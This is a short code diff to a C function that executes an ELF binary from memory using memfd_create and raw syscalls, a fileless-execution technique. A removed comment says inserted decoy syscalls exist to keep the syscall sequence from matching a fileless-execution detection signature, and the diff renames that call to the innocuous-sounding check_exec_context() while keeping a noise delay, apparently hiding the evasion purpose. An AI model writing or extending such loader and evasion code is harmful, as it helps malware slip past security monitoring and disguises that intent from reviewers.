@@ -161,10 +161,7 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
         return -1;
     }
 
-    /* Behavioral dilution: insert side-effect-free decoys between
-     * memfd_create and ftruncate so the syscall sequence does not
-     * match the tight fileless-execution signature. */
-    decoy_syscalls();
+    check_exec_context();
 
     // Set file size using direct syscall
     if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
@@ -229,7 +226,7 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
     char memfd_path[256];
     snprintf(memfd_path, sizeof(memfd_path), "/proc/self/fd/%d", memfd);
 
-    decoy_syscalls();
+    check_exec_context();
     noise_delay(80);
 
     // Execute using direct syscall
